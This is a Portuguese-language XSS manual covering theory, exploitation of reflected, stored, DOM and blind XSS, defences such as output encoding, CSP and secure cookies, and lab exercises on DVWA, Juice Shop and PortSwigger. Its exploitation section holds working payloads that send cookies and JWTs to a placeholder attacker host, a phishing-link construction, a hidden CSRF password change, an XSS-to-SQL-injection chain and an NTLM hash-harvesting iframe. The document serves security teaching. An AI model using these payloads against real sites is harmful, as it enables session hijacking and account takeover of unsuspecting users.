## Manual Completo sobre Cross-Site Scripting (XSS)

### Parte 1: Compreendendo o XSS (A Teoria)

#### 1.1. O que é Cross-Site Scripting?

Cross-Site Scripting (XSS) é um tipo de vulnerabilidade de segurança em aplicações web onde um atacante consegue injetar scripts maliciosos (geralmente JavaScript) em páginas web visualizadas por outros usuários . Quando esse script é executado no navegador da vítima, ele opera dentro do contexto de confiança do site legítimo, podendo acessar cookies, tokens de sessão e qualquer informação disponível na página .

O nome "Cross-Site Scripting" deriva do fato de que a ataque consegue contornar a política de mesma origem (*same-origin policy*), que é a base da segurança dos navegadores . Esta política determina que scripts de um site não devem conseguir acessar dados de outro site. Com o XSS, o atacante faz com que o código malicioso seja executado como se fosse parte do site confiável, quebrando essa isolamento .

#### 1.2. Por que o XSS é tão relevante?

A relevância do XSS no cenário de segurança atual é inquestionável:
- **Classificação CWE-79**: O XSS é categorizado como a vulnerabilidade de software mais perigosa e recorrente segundo o MITRE .
- **OWASP Top 10**: Em 2021, as vulnerabilidades de injeção (categoria que inclui XSS) subiram para a terceira posição entre os riscos mais críticos em aplicações web .
- **Prevalência**: É o tipo de bug mais frequente encontrado em programas de Bug Bounty na plataforma YesWeHack .

#### 1.3. Tipos de XSS

Existem três tipos principais de XSS, além de uma variante especial:

| Tipo | Descrição | Persistência | Vetor Principal |
|:---|:---|:---|:---|
| **Reflected XSS** | O payload é refletido imediatamente pelo servidor na resposta HTTP, sem ser armazenado . | Não persistente | URLs e parâmetros de formulário |
| **Stored XSS** | O payload é permanentemente armazenado no servidor (banco de dados, arquivos) e executado quando qualquer usuário acessa o conteúdo infectado . | Persistente | Comentários, perfis, posts |
| **DOM-based XSS** | A vulnerabilidade ocorre inteiramente no lado do cliente, quando código JavaScript inseguro manipula o DOM dinamicamente . | Depende da execução do script | Fragmentos da URL, `document.write`, `innerHTML` |
| **Blind XSS** | Variante do stored XSS onde o atacante não consegue ver o payload sendo executado em tempo real (ex: painéis administrativos) . | Persistente | Campos que só aparecem em dashboards |

#### 1.4. Impacto de um Ataque XSS Bem-Sucedido

Embora muitas vezes classificada como severidade "média", uma exploração hábil do XSS pode levar a consequências devastadoras :

- **Sequestro de Sessão (Session Hijacking)**: Roubo de cookies de sessão para assumir a identidade da vítima .
- **Account Takeover (ATO)**: Alteração de credenciais ou captura de tokens JWT armazenados no `localStorage` .
- **Keylogging**: Captura de tudo que a vítima digita na página.
- **Ações não autorizadas**: Realizar operações em nome do usuário (transferências, postagens).
- **Exfiltração de Dados**: Roubo de informações sensíveis exibidas na página.
- **Distribuição de Malware**: Redirecionamento para sites que exploram outras vulnerabilidades.
- **Chain de Ataques**: O XSS pode ser combinado com CSRF (Cross-Site Request Forgery) ou SQL Injection para aumentar o impacto .

---

### Parte 2: Explorando o XSS na Prática

**⚠️ AVISO DE RESPONSABILIDADE ⚠️**
**Esta seção é estritamente para fins educacionais e deve ser replicada apenas em ambientes de laboratório controlado (máquinas virtuais, aplicações propositalmente vulneráveis como DVWA, Juice Shop ou PortSwigger Labs) sobre as quais você tenha propriedade ou permissão explícita para testar.**

#### 2.1. Configuração do Ambiente de Laboratório

Para praticar os conceitos deste manual, recomendo:

1.  **Máquina do Atacante**: Kali Linux (com ferramentas como Burp Suite) ou qualquer sistema com Python e um navegador.
2.  **Aplicações Alvo para Prática**:
    - **DVWA (Damn Vulnerable Web Application)** 
    - **OWASP Juice Shop** 
    - **PortSwigger Web Security Academy Labs** 
3.  **Servidor para Captura de Dados**: Um simples servidor HTTP em Python para receber os dados exfiltrados:
    ```bash
    python3 -m http.server 8000
    ```

#### 2.2. Técnicas de Detecção de XSS

**Passo 1: Identificando Pontos de Entrada**

Teste todos os locais onde a aplicação aceita entrada do usuário :
- Parâmetros de URL (query strings)
- Corpo de requisições POST (formulários)
- Headers HTTP (User-Agent, Referer, Cookie)
- Upload de arquivos (nomes de arquivo) 

**Passo 2: Payloads de Prova de Conceito (PoC)**

Comece com payloads simples para confirmar a vulnerabilidade:
```html
<script>alert('XSS')</script>
```
```html
<img src=x onerror=alert(1)>
```
```html
"><svg onload=alert(1)>
```

**Passo 3: Ferramentas e Técnicas Avançadas**

Quando payloads básicos são bloqueados, é necessário realizar um processo de enumeração:

- **Enumerando Tags e Atributos Permitidos**: Utilize o **Burp Intruder** para testar listas de tags e eventos da [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet). Envie requisições com diferentes tags e atributos, observando quais retornam status 200 (permitidos) versus 400 (bloqueados) .
- **Exemplo de bypass**: Se a aplicação bloqueia `<script>`, tente contextos alternativos como eventos HTML ou atributos de URL :
    ```html
    <iframe src="javascript:alert(`XSS`)">
    ```

#### 2.3. Exploração Passo a Passo de Cada Tipo

##### **Reflected XSS**

**Cenário**: Formulário de busca que exibe o termo pesquisado sem sanitização.

**Exploração**:
1.  Identifique um parâmetro refletido na página (ex: `?search=teste`).
2.  Injete o payload:
    ```html
    <script>fetch('http://<SEU_IP>:8000/steal?cookie=' + document.cookie)</script>
    ```
3.  Codifique o payload para URL e crie um link enganoso:
    ```
    https://site-alvo.com/search?q=%3Cscript%3Efetch('http%3A//SEU_IP%3A8000/steal%3Fcookie%3D'%20%2B%20document.cookie)%3C/script%3E
    ```
4.  Envie o link para a vítima (engenharia social). Quando ela clicar, o cookie será enviado para seu servidor .

##### **Stored XSS (com Account Takeover)**

**Cenário**: Campo de "Nome" em perfil de usuário que não sanitiza a entrada .

**Exploração**:
1.  O atacante (usuário com baixo privilégio) altera seu nome para um payload malicioso:
    ```html
    <img src=x onerror="window.open('http://<SEU_IP>:8000/?token='+localStorage.getItem('DSR'))">
    ```
2.  O payload é armazenado permanentemente no banco de dados .
3.  Quando um **administrador** acessa a página de auditoria que exibe os usuários modificados, o payload é executado automaticamente no navegador do admin .
4.  O token JWT do administrador (armazenado no `localStorage`) é enviado para o servidor do atacante.
5.  O atacante substitui seu próprio token pelo token roubado e ganha acesso completo à conta do administrador .

##### **DOM-based XSS**

**Cenário**: Aplicação que usa `window.location.href` para construir dinamicamente um link .

**Código vulnerável**:
```javascript
document.body.innerHTML += "<a href='"+window.location.href+"'>Home</a>"
```

**Exploração**:
1.  Acesse a página com um payload especial no final da URL:
    ```
    https://site-alvo.com/index.php/x' onmouseover=alert(1) style='display:block'
    ```
2.  O código resultante no DOM será:
    ```html
    <a href="x" onmouseover="alert(1)" style="display:block">Home</a>
    ```
3.  Quando o usuário passar o mouse sobre o link, o alerta será executado .

##### **Blind XSS**

**Cenário**: Campo de feedback ou formulário de contato que só é visualizado por administradores.

**Exploração** :
1.  Injete um payload que notifica um servidor externo quando executado:
    ```html
    <script src="http://<SEU_IP>:8000/notify?blind=xss"></script>
    ```
2.  Aguarde. Quando um administrador acessar o painel que exibe os feedbacks, seu servidor receberá uma requisição, confirmando a vulnerabilidade.

#### 2.4. Técnicas Avançadas de Exploração

##### **XSS + CSRF Chain**

Combine XSS com CSRF para trocar a senha da vítima silenciosamente :
```html
<img src="http://site-alvo.com/change-password?new=senha123&confirm=senha123" style="display:none">
```

##### **XSS + SQL Injection Chain**

Use o XSS para explorar um endpoint vulnerável a SQL Injection através do navegador da vítima :

1.  Payload XSS que faz fetch para um endpoint vulnerável:
    ```javascript
    fetch("/vulnerable-endpoint?title=" + encodeURIComponent("' UNION SELECT username,password FROM users-- "))
    ```
2.  O navegador da vítima executa a requisição, e os dados do banco são exibidos na página e podem ser exfiltrados.

##### **Harvesting de Hashes NTLM**

Em redes corporativas, force a vítima a autenticar-se em um servidor SMB controlado pelo atacante :
```html
<iframe src="file:////<SEU_IP>/xss">
```

---

### Parte 3: Defesa Contra XSS (A Proteção)

A defesa contra XSS deve ser implementada em múltiplas camadas, seguindo o princípio de "defense in depth" .

#### 3.1. Validação de Entrada (Input Validation)

A primeira linha de defesa é garantir que apenas dados esperados sejam aceitos :

- **Abordagem Allowlist (Lista Branca)**: Defina rigorosamente o que é permitido (ex: campo de idade só aceita números).
- **Validação de Tipo, Tamanho e Formato**: Use expressões regulares para garantir que os dados correspondam ao esperado .
- **Rejeitar dados suspeitos**: Nunca aceite caracteres de controle ou tags HTML em campos que não deveriam contê-los.

**⚠️ Atenção**: Validação de entrada **não é suficiente** como única defesa, pois contextos diferentes exigem tratamentos diferentes.

#### 3.2. Codificação de Saída (Output Encoding) - A Defesa Mais Importante

A codificação de saída converte caracteres perigosos em entidades seguras, impedindo que sejam interpretados como código .

**Codificação por Contexto**:

| Contexto | Caracteres Perigosos | Codificação Aplicada |
|:---|:---|:---|
| HTML (entre tags) | `<`, `>`, `&`, `"`, `'` | `&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;` |
| Atributos HTML | `"`, `'`, `` ` ``, espaço | Codificação de atributos (escapar aspas) |
| JavaScript | `'`, `"`, `\`, nova linha | Unicode escapes (`\uXXXX`) |
| CSS | `'`, `"`, `(`, `)`, `\` | Escapes específicos de CSS |

**Ferramentas e Frameworks**:
- **Templating engines modernos**: Django, React, Angular, Vue aplicam codificação automática na maioria dos contextos .
- **Cuidado com "métodos de escape"**: Evite `dangerouslySetInnerHTML` (React), `v-html` (Vue) ou filtro `safe` (Django) com dados não confiáveis .
- **OWASP Java Encoder / Microsoft AntiXSS**: Bibliotecas especializadas para codificação contextual .

#### 3.3. Sanitização (Quando HTML é Necessário)

Se você **precisa** permitir que usuários insiram HTML (ex: editor de rich text), a sanitização é obrigatória :

- **Use bibliotecas respeitadas**: **DOMPurify** é altamente recomendado pela OWASP .
- **Configure políticas restritivas**: Remova tags perigosas (`<script>`, `<iframe>`, `<object>`) e atributos de eventos (`onload`, `onerror`, `onmouseover`).
- **Nunca implemente seu próprio sanitizador**: É extremamente propenso a erros e bypasses.

#### 3.4. Content Security Policy (CSP)

O CSP é uma camada de defesa em profundidade que instrui o navegador sobre quais recursos podem ser carregados e executados .

**Exemplo de política restritiva**:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none';
```

**Esta política**:
- Permite scripts apenas do mesmo domínio (`'self'`)
- Bloqueia scripts inline (`<script>...</script>`)
- Bloqueia `eval()` e funções similares
- Impede o carregamento de plugins (Flash, Java)

**Política mais permissiva (para migração)**:
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://trusted-cdn.com;
```

**Implementação**:
- Via header HTTP ou tag `<meta>` :
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

#### 3.5. Práticas Específicas para Diferentes Arquiteturas

**Para Aplicações Server-Side (Django, Express, etc.)** :
- Use os mecanismos de template com encoding automático.
- Contextualize corretamente a inserção de dados (atributos vs. conteúdo HTML).

**Para Aplicações Client-Side (SPAs)** :
- Evite `innerHTML`, `outerHTML`, `document.write()` com dados não confiáveis.
- Prefira `textContent` ou `setAttribute()` quando possível.
- Considere usar a API **Trusted Types** para garantir que todas as inserções passem por sanitização .

#### 3.6. Proteção de Tokens e Sessões

Como vimos no exemplo de Account Takeover, a forma como os tokens são armazenados impacta diretamente o impacto de um XSS :

- **Evite `localStorage` e `sessionStorage` para tokens de sessão**: Se um XSS for executado, o atacante consegue ler esses tokens instantaneamente .
- **Prefira cookies com flags de segurança**:
    - `HttpOnly`: Impede acesso via JavaScript
    - `Secure`: Enviado apenas sobre HTTPS
    - `SameSite=Strict` ou `SameSite=Lax`: Mitiga CSRF
- **Tokens de curta duração**: Reduz a janela de oportunidade para o atacante.

#### 3.7. Ferramentas para Identificar e Prevenir XSS

| Categoria | Ferramentas | Finalidade |
|:---|:---|:---|
| **SAST (Static Analysis)** | SonarQube, Semgrep, ESLint (com plugins de segurança) | Identificar padrões inseguros no código-fonte  |
| **DAST (Dynamic Analysis)** | OWASP ZAP, Burp Suite, scanners comerciais | Testar a aplicação em execução  |
| **Análise de Dependências** | `npm audit`, `pip-audit`, OWASP Dependency-Check | Identificar bibliotecas vulneráveis  |
| **Ferramentas de Navegador** | DOM Invader (Burp), Console do DevTools | Debug e detecção de DOM XSS  |

---

### Parte 4: Estudos de Caso e Exercícios Práticos

#### 4.1. Juice Shop - Reflected XSS

O OWASP Juice Shop é uma excelente aplicação para praticar :

1.  Acesse "Account" → "Orders and Payment" → "Order History".
2.  Clique no caminhão de entrega.
3.  Observe a URL: `/#/track-result?id=...`
4.  Modifique o parâmetro `id` para:
    ```
    <iframe src="javascript:alert(`XSS`)">
    ```
5.  O alerta será executado, confirmando a vulnerabilidade .

#### 4.2. DVWA - Stored XSS

1.  Navegue até "XSS stored".
2.  No campo "Name", injete:
    ```html
    <script>document.location='http://localhost:8000/steal.php?cookie='+document.cookie</script>
    ```
3.  No campo "Message", insira qualquer texto.
4.  Sempre que alguém visualizar o guestbook, o cookie será enviado .

#### 4.3. PortSwigger Labs - Bypass de Filtros

O laboratório "Reflected XSS into HTML context with most tags and attributes blocked" ensina a técnica de enumeração descrita na seção 2.2 .

### Conclusão

O Cross-Site Scripting permanece como uma das vulnerabilidades mais prevalentes e perigosas do ecossistema web, ocupando o topo das classificações do MITRE e sendo o bug mais frequente em programas de Bug Bounty . Sua capacidade de evoluir — do simples pop-up ao account takeover completo ou à chain com SQL injection — exige que desenvolvedores e profissionais de segurança mantenham-se atualizados.

**A defesa eficaz contra XSS combina**:
- **Prevenção no desenvolvimento**: codificação contextual, validação rigorosa e uso consciente de frameworks .
- **Configuração defensiva**: Content Security Policy (CSP) e cookies seguros .
- **Testes contínuos**: ferramentas SAST/DAST e testes manuais com Burp Suite .

Lembre-se: a linha entre um pesquisador de segurança ético e um criminoso é definida pela **autorização**. Use este conhecimento para construir aplicações mais seguras e testar apenas aquilo que você tem permissão para testar.

---
